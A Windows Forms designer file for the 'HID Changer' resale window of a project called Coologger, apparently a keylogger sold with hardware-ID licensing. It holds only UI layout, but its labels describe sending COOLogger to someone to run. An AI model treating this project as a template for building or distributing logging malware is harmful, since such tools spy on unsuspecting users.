using System;

namespace Coologger
{
    partial class ResaleForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            Coologger.Pigment pigment1 = new Coologger.Pigment();
            Coologger.Pigment pigment2 = new Coologger.Pigment();
            Coologger.Pigment pigment3 = new Coologger.Pigment();
            Coologger.Pigment pigment4 = new Coologger.Pigment();
            Coologger.Pigment pigment5 = new Coologger.Pigment();
            Coologger.Pigment pigment6 = new Coologger.Pigment();
            Coologger.Pigment pigment7 = new Coologger.Pigment();
            Coologger.Pigment pigment8 = new Coologger.Pigment();
            Coologger.Pigment pigment9 = new Coologger.Pigment();
            Coologger.Pigment pigment10 = new Coologger.Pigment();
            Coologger.Pigment pigment11 = new Coologger.Pigment();
            Coologger.Pigment pigment12 = new Coologger.Pigment();
            Coologger.Pigment pigment13 = new Coologger.Pigment();
            Coologger.Pigment pigment14 = new Coologger.Pigment();
            this.TextBox1 = new System.Windows.Forms.TextBox();
            this.PictureBox1 = new System.Windows.Forms.PictureBox();
            this.PictureBox2 = new System.Windows.Forms.PictureBox();
            this.FButton1 = new Coologger.FButton();
            this.Label2 = new System.Windows.Forms.Label();
            this.Label3 = new System.Windows.Forms.Label();
            this.Label5 = new System.Windows.Forms.Label();
            this.Label6 = new System.Windows.Forms.Label();
            this.Label4 = new System.Windows.Forms.Label();
            this.FButton2 = new Coologger.FButton();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).BeginInit();
            this.SuspendLayout();
            // 
            // TextBox1
            // 
            this.TextBox1.Location = new System.Drawing.Point(25, 140);
            this.TextBox1.Name = "TextBox1";
            this.TextBox1.Size = new System.Drawing.Size(234, 20);
            this.TextBox1.TabIndex = 16;
            // 
            // PictureBox1
            // 
            this.PictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.PictureBox1.Location = new System.Drawing.Point(1, 1);
            this.PictureBox1.Name = "PictureBox1";
            this.PictureBox1.Size = new System.Drawing.Size(239, 25);
            this.PictureBox1.TabIndex = 23;
            this.PictureBox1.TabStop = false;
            // 
            // PictureBox2
            // 
            this.PictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.PictureBox2.Location = new System.Drawing.Point(248, 0);
            this.PictureBox2.Name = "PictureBox2";
            this.PictureBox2.Size = new System.Drawing.Size(17, 25);
            this.PictureBox2.TabIndex = 24;
            this.PictureBox2.TabStop = false;
            this.PictureBox2.Click += new System.EventHandler(this.PictureBox2_Click);
            // 
            // FButton1
            // 
            pigment1.Name = "Border";
            pigment1.Value = System.Drawing.Color.Black;
            pigment2.Name = "Backcolor";
            pigment2.Value = System.Drawing.Color.Black;
            pigment3.Name = "Highlight";
            pigment3.Value = System.Drawing.Color.Transparent;
            pigment4.Name = "Gradient1";
            pigment4.Value = System.Drawing.Color.LimeGreen;
            pigment5.Name = "Gradient2";
            pigment5.Value = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(86)))), ((int)(((byte)(0)))));
            pigment6.Name = "Text Color";
            pigment6.Value = System.Drawing.Color.White;
            pigment7.Name = "Text Shadow";
            pigment7.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.FButton1.Colors = new Coologger.Pigment[] {
        pigment1,
        pigment2,
        pigment3,
        pigment4,
        pigment5,
        pigment6,
        pigment7};
            this.FButton1.Font = new System.Drawing.Font("Verdana", 8F);
            this.FButton1.Location = new System.Drawing.Point(57, 237);
            this.FButton1.Name = "FButton1";
            this.FButton1.Shadow = true;
            this.FButton1.Size = new System.Drawing.Size(81, 19);
            this.FButton1.TabIndex = 15;
            this.FButton1.Text = "Change HID";
            this.FButton1.Click += new System.EventHandler(this.FButton2_Click);
            // 
            // Label2
            // 
            this.Label2.AutoSize = true;
            this.Label2.BackColor = System.Drawing.Color.Transparent;
            this.Label2.ForeColor = System.Drawing.Color.White;
            this.Label2.Location = new System.Drawing.Point(79, 170);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(130, 13);
            this.Label2.TabIndex = 18;
            this.Label2.Text = "HID Changing instructions";
            // 
            // Label3
            // 
            this.Label3.AutoSize = true;
            this.Label3.BackColor = System.Drawing.Color.Transparent;
            this.Label3.ForeColor = System.Drawing.Color.White;
            this.Label3.Location = new System.Drawing.Point(42, 183);
            this.Label3.Name = "Label3";
            this.Label3.Size = new System.Drawing.Size(217, 13);
            this.Label3.TabIndex = 19;
            this.Label3.Text = "First send COOLogger, and have them run it ";
            // 
            // Label5
            // 
            this.Label5.AutoSize = true;
            this.Label5.BackColor = System.Drawing.Color.Transparent;
            this.Label5.ForeColor = System.Drawing.Color.White;
            this.Label5.Location = new System.Drawing.Point(42, 209);
            this.Label5.Name = "Label5";
            this.Label5.Size = new System.Drawing.Size(217, 13);
            this.Label5.TabIndex = 21;
            this.Label5.Text = "enter it here and click change HID after they";
            // 
            // Label6
            // 
            this.Label6.AutoSize = true;
            this.Label6.BackColor = System.Drawing.Color.Transparent;
            this.Label6.ForeColor = System.Drawing.Color.White;
            this.Label6.Location = new System.Drawing.Point(42, 222);
            this.Label6.Name = "Label6";
            this.Label6.Size = new System.Drawing.Size(59, 13);
            this.Label6.TabIndex = 22;
            this.Label6.Text = "registered. ";
            // 
            // Label4
            // 
            this.Label4.AutoSize = true;
            this.Label4.BackColor = System.Drawing.Color.Transparent;
            this.Label4.ForeColor = System.Drawing.Color.White;
            this.Label4.Location = new System.Drawing.Point(42, 196);
            this.Label4.Name = "Label4";
            this.Label4.Size = new System.Drawing.Size(198, 13);
            this.Label4.TabIndex = 20;
            this.Label4.Text = "ask for their HID off the registration page";
            // 
            // FButton2
            // 
            pigment8.Name = "Border";
            pigment8.Value = System.Drawing.Color.Black;
            pigment9.Name = "Backcolor";
            pigment9.Value = System.Drawing.Color.Black;
            pigment10.Name = "Highlight";
            pigment10.Value = System.Drawing.Color.Transparent;
            pigment11.Name = "Gradient1";
            pigment11.Value = System.Drawing.Color.LimeGreen;
            pigment12.Name = "Gradient2";
            pigment12.Value = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(86)))), ((int)(((byte)(0)))));
            pigment13.Name = "Text Color";
            pigment13.Value = System.Drawing.Color.White;
            pigment14.Name = "Text Shadow";
            pigment14.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.FButton2.Colors = new Coologger.Pigment[] {
        pigment8,
        pigment9,
        pigment10,
        pigment11,
        pigment12,
        pigment13,
        pigment14};
            this.FButton2.Font = new System.Drawing.Font("Verdana", 8F);
            this.FButton2.Location = new System.Drawing.Point(157, 237);
            this.FButton2.Name = "FButton2";
            this.FButton2.Shadow = true;
            this.FButton2.Size = new System.Drawing.Size(83, 19);
            this.FButton2.TabIndex = 25;
            this.FButton2.Text = "Copy my HID";
            this.FButton2.Click += new System.EventHandler(this.FButton2_Click_1);
            // 
            // resale
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackgroundImage = global::Coologger.Properties.Resources.HIDPreview;
            this.ClientSize = new System.Drawing.Size(284, 264);
            this.Controls.Add(this.FButton2);
            this.Controls.Add(this.PictureBox2);
            this.Controls.Add(this.PictureBox1);
            this.Controls.Add(this.Label6);
            this.Controls.Add(this.Label5);
            this.Controls.Add(this.Label4);
            this.Controls.Add(this.Label3);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.TextBox1);
            this.Controls.Add(this.FButton1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "resale";
            this.Text = "HID Changer";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }
        internal Coologger.FButton FButton1;
        internal System.Windows.Forms.TextBox TextBox1;
        internal System.Windows.Forms.PictureBox PictureBox1;
        internal System.Windows.Forms.PictureBox PictureBox2;
        internal System.Windows.Forms.Label Label2;
        internal System.Windows.Forms.Label Label3;
        internal System.Windows.Forms.Label Label5;
        internal System.Windows.Forms.Label Label6;
        internal System.Windows.Forms.Label Label4;
        internal Coologger.FButton FButton2;


        #endregion
    }
}